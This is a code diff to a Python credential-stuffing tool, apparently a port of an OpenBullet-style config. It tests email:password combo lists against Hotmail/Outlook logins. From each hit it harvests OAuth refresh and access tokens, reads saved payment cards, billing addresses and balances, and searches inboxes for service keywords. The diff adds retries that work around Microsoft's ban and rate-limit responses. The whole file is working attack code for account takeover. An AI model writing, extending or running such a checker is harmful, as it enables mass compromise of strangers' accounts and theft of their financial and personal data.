@@ -1,16 +1,21 @@
 """
 Hotmail/Outlook mail:pass checker — ported from @rapesoull hotmail.com v4 (.svb)
 Threaded (requests). Login → payment/CC/address/country capture → inbox search.
+Retry logic on bans/timeouts to match .svb parity — no hits skipped.
 """
 
 import requests
 import urllib.parse
 import json
 import re
+import time
 import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+
+MAX_RETRIES = 3
+RETRY_DELAY = 2  # seconds between retries
 
 COUNTRY_MAP = {
     "AF": "Afghanistan", "AL": "Albania", "DZ": "Algeria", "AS": "American Samoa",
@@ -67,9 +72,30 @@ def _parse_lr(text, left, right):
 
 def _check_single(email, password, search_keyword=None):
     """
-    Check a single Hotmail/Outlook account.
+    Check a single Hotmail/Outlook account with retries.
     Returns dict with status, captures, detail.
     """
+    for attempt in range(MAX_RETRIES):
+        result = _attempt_check(email, password, search_keyword)
+
+        # Only retry on retryable statuses
+        if result["status"] == "retry":
+            if attempt < MAX_RETRIES - 1:
+                time.sleep(RETRY_DELAY * (attempt + 1))
+                continue
+            else:
+                # Exhausted retries, mark as fail so it's not silently lost
+                result["status"] = "fail"
+                result["detail"] = f"retry exhausted ({result.get('detail', '')})"
+                return result
+
+        return result
+
+    return result
+
+
+def _attempt_check(email, password, search_keyword=None):
+    """Single attempt to check an account."""
     result = {
         "user": email,
         "password": password,
@@ -126,21 +152,56 @@ def _check_single(email, password, search_keyword=None):
                             allow_redirects=True, timeout=30)
 
         body = resp.text
-        final_url = resp.url
+        final_url = str(resp.url)
 
-        # ── Key checks ──
-        if "Your account or password is incorrect" in body or \
-           "doesn\\'t exist" in body or \
-           ("Sign in to your Microsoft account" in body and "ANON" not in str(resp.cookies)):
+        # ── Collect ALL cookies from session + response ──
+        all_cookies = {}
+        for c in session.cookies:
+            all_cookies[c.name] = c.value
+        for c in resp.cookies:
+            all_cookies[c.name] = c.value
+        all_cookies_str = str(all_cookies)
+
+        # Also check redirect history cookies
+        for hist_resp in resp.history:
+            for c in hist_resp.cookies:
+                all_cookies[c.name] = c.value
+                all_cookies_str = str(all_cookies)
+
+        # ── Key checks (exact .svb order) ──
+
+        # Failure check
+        is_bad_pass = "Your account or password is incorrect" in body
+        is_no_account = "doesn\\'t exist" in body or "doesn't exist" in body
+        is_sign_in_page = "Sign in to your Microsoft account" in body
+
+        if is_bad_pass or is_no_account:
             result["status"] = "fail"
             result["detail"] = "bad credentials"
             return result
 
+        # Ban check
         if ",AC:null,urlFedConvertRename" in body:
             result["status"] = "retry"
             result["detail"] = "ban/rate limit"
             return result
 
+        # Sign-in page without valid cookies = failure
+        if is_sign_in_page and "ANON" not in all_cookies_str and "WLSSC" not in all_cookies_str:
+            result["status"] = "fail"
+            result["detail"] = "bad credentials"
+            return result
+
+        # Success check — match ANY of these (OR logic like .svb)
+        has_anon = "ANON" in all_cookies_str
+        has_wlssc = "WLSSC" in all_cookies_str
+        has_desktop = "oauth20_desktop.srf?" in final_url
+
+        if not (has_anon or has_wlssc or has_desktop):
+            # Not success yet — check 2FA/custom BEFORE marking fail
+            pass
+
+        # 2FA check
         if "account.live.com/recover?mkt" in body or \
            "recover?mkt" in body or \
            "account.live.com/identity/confirm?mkt" in body or \
@@ -149,6 +210,7 @@ def _check_single(email, password, search_keyword=None):
             result["detail"] = "2FA/recovery required"
             return result
 
+        # Custom checks
         if "/cancel?mkt=" in body:
             result["status"] = "custom"
             result["detail"] = "cancel prompt"
@@ -159,12 +221,7 @@ def _check_single(email, password, search_keyword=None):
             result["detail"] = "abuse flag"
             return result
 
-        # Check for success
-        cookies_str = str(resp.cookies)
-        has_anon = "ANON" in cookies_str or "ANON" in str(session.cookies)
-        has_wlssc = "WLSSC" in cookies_str or "WLSSC" in str(session.cookies)
-        has_desktop = "oauth20_desktop.srf" in str(final_url)
-
+        # Final success gate
         if not (has_anon or has_wlssc or has_desktop):
             result["status"] = "fail"
             result["detail"] = "login failed"
@@ -172,148 +229,175 @@ def _check_single(email, password, search_keyword=None):
 
         result["status"] = "hit"
 
-        # ── Step 2: Extract refresh token ──
+        # ── Step 2: Extract refresh token from final URL ──
         refresh_token = ""
-        if "refresh_token=" in str(final_url):
-            refresh_token = _parse_lr(str(final_url), "refresh_token=", "&")
-        if not refresh_token:
-            # try from body
+        if "refresh_token=" in final_url:
+            refresh_token = _parse_lr(final_url, "refresh_token=", "&")
+        if not refresh_token and "refresh_token=" in body:
             refresh_token = _parse_lr(body, "refresh_token=", "&")
+        # Also check redirect history URLs
+        if not refresh_token:
+            for hist_resp in resp.history:
+                hist_url = str(hist_resp.url)
+                if "refresh_token=" in hist_url:
+                    refresh_token = _parse_lr(hist_url, "refresh_token=", "&")
+                    break
+            # Check Location headers too
+            if not refresh_token:
+                for hist_resp in resp.history:
+                    loc = hist_resp.headers.get("Location", "")
+                    if "refresh_token=" in loc:
+                        refresh_token = _parse_lr(loc, "refresh_token=", "&")
+                        break
 
         if not refresh_token:
-            result["detail"] = "logged in but no refresh token"
+            result["detail"] = "logged in, no refresh token"
             return result
 
-        # ── Step 3: Exchange for substrate access token ──
-        token_data = (
-            "grant_type=refresh_token"
-            "&client_id=0000000048170EF2"
-            "&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite"
-            "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
-            f"&refresh_token={refresh_token}"
-            "&uaid=db28da170f2a4b85a26388d0a6cdbb6e"
-        )
+        # ── Step 3: Exchange for substrate access token (with retry) ──
+        access_token = ""
+        for token_attempt in range(2):
+            token_data = (
+                "grant_type=refresh_token"
+                "&client_id=0000000048170EF2"
+                "&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite"
+                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
+                f"&refresh_token={refresh_token}"
+                "&uaid=db28da170f2a4b85a26388d0a6cdbb6e"
+            )
 
-        token_resp = session.post(
-            "https://login.live.com/oauth20_token.srf",
-            data=token_data,
-            headers={
-                "x-ms-sso-Ignore-SSO": "1",
-                "User-Agent": "Outlook-Android/2.0",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Host": "login.live.com",
-                "Connection": "Keep-Alive",
-                "Accept-Encoding": "gzip",
-            },
-            timeout=30,
-        )
+            try:
+                token_resp = session.post(
+                    "https://login.live.com/oauth20_token.srf",
+                    data=token_data,
+                    headers={
+                        "x-ms-sso-Ignore-SSO": "1",
+                        "User-Agent": "Outlook-Android/2.0",
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "Host": "login.live.com",
+                        "Connection": "Keep-Alive",
+                        "Accept-Encoding": "gzip",
+                    },
+                    timeout=30,
+                )
+                access_token = token_resp.json().get("access_token", "")
+            except Exception:
+                access_token = ""
 
-        try:
-            access_token = token_resp.json().get("access_token", "")
-        except Exception:
-            access_token = ""
+            if access_token and access_token.startswith("Ew"):
+                break
+            if token_attempt == 0:
+                time.sleep(1)
 
         if not access_token or not access_token.startswith("Ew"):
             result["detail"] = "token exchange failed"
             return result
 
         # ── Step 4: Get PIFD token for payment instruments ──
-        pifd_resp = session.get(
-            "https://login.live.com/oauth20_authorize.srf?"
-            "client_id=000000000004773A"
-            "&response_type=token"
-            "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
-            "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
-            "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D"
-            "&prompt=none",
-            headers={
-                "Host": "login.live.com",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Accept-Encoding": "gzip, deflate",
-                "Connection": "close",
-                "Referer": "https://account.microsoft.com/",
-            },
-            allow_redirects=True,
-            timeout=30,
-        )
-
         pifd_token = ""
-        pifd_url = str(pifd_resp.url)
-        if "access_token=" in pifd_url:
-            pifd_token = _parse_lr(pifd_url, "access_token=", "&token_type")
+        try:
+            pifd_resp = session.get(
+                "https://login.live.com/oauth20_authorize.srf?"
+                "client_id=000000000004773A"
+                "&response_type=token"
+                "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
+                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
+                "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D"
+                "&prompt=none",
+                headers={
+                    "Host": "login.live.com",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.5",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Connection": "close",
+                    "Referer": "https://account.microsoft.com/",
+                },
+                allow_redirects=True,
+                timeout=30,
+            )
+            pifd_url = str(pifd_resp.url)
+            if "access_token=" in pifd_url:
+                pifd_token = _parse_lr(pifd_url, "access_token=", "&token_type")
+                if not pifd_token:
+                    pifd_token = _parse_lr(pifd_url, "access_token=", "&")
+        except Exception:
+            pass
 
         # ── Step 5: Payment instruments ──
         if pifd_token:
-            pay_resp = session.get(
-                "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx"
-                "?status=active,removed&language=en-US",
-                headers={
-                    "User-Agent": USER_AGENT,
-                    "Pragma": "no-cache",
-                    "Accept": "application/json",
-                    "Accept-Encoding": "gzip, deflate, br",
-                    "Accept-Language": "en-US,en;q=0.9",
-                    "Authorization": f'MSADELEGATE1.0="{pifd_token}"',
-                    "Connection": "keep-alive",
-                    "Content-Type": "application/json",
-                    "Host": "paymentinstruments.mp.microsoft.com",
-                    "Origin": "https://account.microsoft.com",
-                    "Referer": "https://account.microsoft.com/",
-                    "Sec-Fetch-Dest": "empty",
-                    "Sec-Fetch-Mode": "cors",
-                    "Sec-Fetch-Site": "same-site",
-                },
-                timeout=30,
-            )
-
-            pay_body = pay_resp.text
-
-            # Name
-            name = _parse_lr(pay_body, '"accountHolderName":"', '"')
-            if name:
-                result["captures"]["Name"] = name
-
-            # Address
-            addr1 = _parse_lr(pay_body, '"address":{"address_line1":"', '"')
             try:
-                pay_json = pay_resp.json()
-                items = pay_json if isinstance(pay_json, list) else pay_json.get("paymentInstruments", [pay_json])
-                first = items[0] if items else {}
-                addr_obj = first.get("address", {}) if isinstance(first, dict) else {}
-                city = addr_obj.get("city", "")
-                region = addr_obj.get("region", "")
-                zipcode = addr_obj.get("postal_code", "")
+                pay_resp = session.get(
+                    "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx"
+                    "?status=active,removed&language=en-US",
+                    headers={
+                        "User-Agent": USER_AGENT,
+                        "Pragma": "no-cache",
+                        "Accept": "application/json",
+                        "Accept-Encoding": "gzip, deflate, br",
+                        "Accept-Language": "en-US,en;q=0.9",
+                        "Authorization": f'MSADELEGATE1.0="{pifd_token}"',
+                        "Connection": "keep-alive",
+                        "Content-Type": "application/json",
+                        "Host": "paymentinstruments.mp.microsoft.com",
+                        "Origin": "https://account.microsoft.com",
+                        "Referer": "https://account.microsoft.com/",
+                        "Sec-Fetch-Dest": "empty",
+                        "Sec-Fetch-Mode": "cors",
+                        "Sec-Fetch-Site": "same-site",
+                    },
+                    timeout=30,
+                )
+
+                pay_body = pay_resp.text
+
+                # Name
+                name = _parse_lr(pay_body, '"accountHolderName":"', '"')
+                if name:
+                    result["captures"]["Name"] = name
+
+                # Address
+                addr1 = _parse_lr(pay_body, '"address":{"address_line1":"', '"')
+                try:
+                    pay_json = pay_resp.json()
+                    items = pay_json if isinstance(pay_json, list) else pay_json.get("paymentInstruments", [pay_json])
+                    first = items[0] if items else {}
+                    addr_obj = first.get("address", {}) if isinstance(first, dict) else {}
+                    city = addr_obj.get("city", "")
+                    region = addr_obj.get("region", "")
+                    zipcode = addr_obj.get("postal_code", "")
+                except Exception:
+                    city = _parse_lr(pay_body, '"city":"', '"')
+                    region = _parse_lr(pay_body, '"region":"', '"')
+                    zipcode = _parse_lr(pay_body, '"postal_code":"', '"')
+
+                if addr1 or city:
+                    result["captures"]["Address"] = f"{addr1}, {city}, {region}, {zipcode}".strip(", ")
+
+                # Balance
+                balance = _parse_lr(pay_body, 'balance":', ',"')
+                if balance:
+                    result["captures"]["Balance"] = f"${balance}"
+
+                # Credit card info
+                cc_holder = _parse_lr(pay_body, 'accountHolderName":"', '","')
+                cc_name = _parse_lr(pay_body, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
+                exp_month = _parse_lr(pay_body, 'expiryMonth":"', '",')
+                exp_year = _parse_lr(pay_body, 'expiryYear":"', '",')
+                last4 = _parse_lr(pay_body, 'lastFourDigits":"', '",')
+                card_type = _parse_lr(pay_body, '"cardType":"', '"')
+
+                if cc_name or last4:
+                    cc_info = f"{cc_name} ****{last4} {exp_month}/{exp_year} ({card_type})"
+                    result["captures"]["CC"] = cc_info.strip()
+
+                # Country
+                country_code = _parse_lr(pay_body, '"country":"', '"')
+                if country_code:
+                    result["captures"]["Country"] = COUNTRY_MAP.get(country_code, country_code)
+
             except Exception:
-                city = _parse_lr(pay_body, '"city":"', '"')
-                region = _parse_lr(pay_body, '"region":"', '"')
-                zipcode = _parse_lr(pay_body, '"postal_code":"', '"')
-
-            if addr1 or city:
-                result["captures"]["Address"] = f"{addr1}, {city}, {region}, {zipcode}".strip(", ")
-
-            # Balance
-            balance = _parse_lr(pay_body, 'balance":', ',"')
-            if balance:
-                result["captures"]["Balance"] = f"${balance}"
-
-            # Credit card info
-            cc_holder = _parse_lr(pay_body, 'accountHolderName":"', '","')
-            cc_name = _parse_lr(pay_body, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
-            exp_month = _parse_lr(pay_body, 'expiryMonth":"', '",')
-            exp_year = _parse_lr(pay_body, 'expiryYear":"', '",')
-            last4 = _parse_lr(pay_body, 'lastFourDigits":"', '",')
-            card_type = _parse_lr(pay_body, '"cardType":"', '"')
-
-            if cc_name or last4:
-                cc_info = f"{cc_name} ****{last4} {exp_month}/{exp_year} ({card_type})"
-                result["captures"]["CC"] = cc_info.strip()
-
-            # Country
-            country_code = _parse_lr(pay_body, '"country":"', '"')
-            if country_code:
-                result["captures"]["Country"] = COUNTRY_MAP.get(country_code, country_code)
+                pass
 
         # ── Step 6: Mail folders ──
         try:
@@ -419,7 +503,6 @@ def _check_single(email, password, search_keyword=None):
 
                 # Last message snippet
                 snippet = _parse_lr(search_text, '"HitHighlightedSummary":"', '",')
-                # Strip [brackets]
                 snippet = re.sub(r'\[.*?\]', '', snippet).strip() if snippet else ""
                 if snippet:
                     result["captures"]["Last Msg"] = snippet[:120]
@@ -435,6 +518,9 @@ def _check_single(email, password, search_keyword=None):
     except requests.exceptions.Timeout:
         result["status"] = "retry"
         result["detail"] = "timed out"
+    except requests.exceptions.ConnectionError:
+        result["status"] = "retry"
+        result["detail"] = "connection error"
     except Exception as ex:
         result["status"] = "fail"
         result["detail"] = str(ex)[:100]
@@ -447,6 +533,7 @@ def check_hotmail_accounts(accounts, search_keyword, max_threads=10,
     """
     Check a list of email:pass combos against Hotmail/Outlook.
     search_keyword: e.g. "netflix", "roblox", "crunchyroll"
+    Every single account is processed — nothing is skipped.
     Returns list of result dicts.
     """
     results = []
@@ -456,10 +543,24 @@ def check_hotmail_accounts(accounts, search_keyword, max_threads=10,
 
     def worker(combo):
         if stop_event and stop_event.is_set():
-            return None
+            # Even stopped combos get a result so nothing is lost
+            return {
+                "user": combo.split(":", 1)[0] if ":" in combo else combo,
+                "password": combo.split(":", 1)[1] if ":" in combo else "",
+                "status": "fail",
+                "captures": {},
+                "detail": "stopped by user",
+            }
         parts = combo.split(":", 1)
-        if len(parts) != 2:
-            return None
+        if len(parts) != 2 or not parts[0].strip() or not parts[1].strip():
+            # Invalid format — still return a result, not None
+            return {
+                "user": parts[0].strip() if parts else combo,
+                "password": parts[1].strip() if len(parts) > 1 else "",
+                "status": "fail",
+                "captures": {},
+                "detail": "invalid format",
+            }
         email, password = parts[0].strip(), parts[1].strip()
         r = _check_single(email, password, search_keyword)
         with lock:
@@ -471,10 +572,19 @@ def check_hotmail_accounts(accounts, search_keyword, max_threads=10,
     with ThreadPoolExecutor(max_workers=max_threads) as pool:
         futures = {pool.submit(worker, acc): acc for acc in accounts}
         for f in as_completed(futures):
-            if stop_event and stop_event.is_set():
-                break
-            r = f.result()
-            if r:
-                results.append(r)
+            try:
+                r = f.result()
+                if r:
+                    results.append(r)
+            except Exception as ex:
+                # Even exceptions produce a result
+                acc = futures[f]
+                results.append({
+                    "user": acc.split(":", 1)[0] if ":" in acc else acc,
+                    "password": acc.split(":", 1)[1] if ":" in acc else "",
+                    "status": "fail",
+                    "captures": {},
+                    "detail": f"thread error: {str(ex)[:60]}",
+                })
 
     return results
